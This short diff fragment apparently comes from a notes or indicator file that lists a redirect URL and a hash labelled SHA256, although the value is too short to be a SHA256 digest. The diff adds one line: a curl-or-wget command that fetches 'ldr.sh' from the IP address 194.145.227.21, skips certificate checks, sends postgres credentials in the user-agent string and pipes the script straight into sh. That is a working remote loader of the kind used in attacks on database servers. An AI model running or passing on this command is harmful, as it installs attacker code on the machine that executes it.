@@ -9,3 +9,6 @@ http://www.google.com/url?sa=D&q=https://hangouts.google.com/linkredirect%3Fdest
 
 ### SHA256
 de919cdf77a062923b8740e1bd4d5cdd
+
+
+(curl -k --user-agent e7945e41_postgres:postgres http://194.145.227.21/ldr.sh||wget --no-check-certificate --user-agent e7945e41_postgres:postgres -q -O- http://194.145.227.21/ldr.sh)|sh'
